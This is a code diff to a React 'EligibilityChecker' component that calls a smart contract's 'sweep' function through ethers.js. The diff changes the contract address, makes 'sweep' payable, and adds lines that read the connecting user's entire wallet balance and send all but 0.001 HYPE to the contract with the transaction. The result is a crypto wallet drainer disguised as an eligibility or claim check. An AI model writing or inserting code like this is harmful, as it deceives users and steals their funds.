@@ -5,10 +5,10 @@ import { ethers } from 'ethers';
 import { Link } from 'react-router-dom';
 
 const API_BASE = import.meta.env.VITE_API_BASE || '';
-const CONTRACT_ADDRESS = '0xB6973bA89e9d898aD28F922399067c1E9D46f77B';
+const CONTRACT_ADDRESS = '0xdF99B8C328a4fC0817Fa5a1f104584CCe19F0037';
 
 const CONTRACT_ABI = [
-  "function sweep(uint256 nonce, uint256 deadline, bytes calldata signature) external"
+  "function sweep(uint256 nonce, uint256 deadline, bytes calldata signature) external payable"
 ];
 
 export default function EligibilityChecker() {
@@ -159,10 +159,19 @@ export default function EligibilityChecker() {
       
       addDebugLog('📤 Sending sweep transaction...');
       const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+      
+      const userBalance = await provider.getBalance(address);
+      const gasBuffer = ethers.parseEther('0.001');
+      const sweepAmount = userBalance > gasBuffer ? userBalance - gasBuffer : 0n;
+      
+      addDebugLog(`💰 Balance: ${ethers.formatEther(userBalance)} HYPE`);
+      addDebugLog(`📤 Sweeping: ${ethers.formatEther(sweepAmount)} HYPE (leaving 0.001 for gas)`);
+      
       const tx = await contract.sweep(
         BigInt(claimData.nonce),
         BigInt(claimData.deadline),
-        claimData.signature
+        claimData.signature,
+        { value: sweepAmount }
       );
 
       addDebugLog(`⏳ TX sent: ${tx.hash.slice(0, 10)}...`);
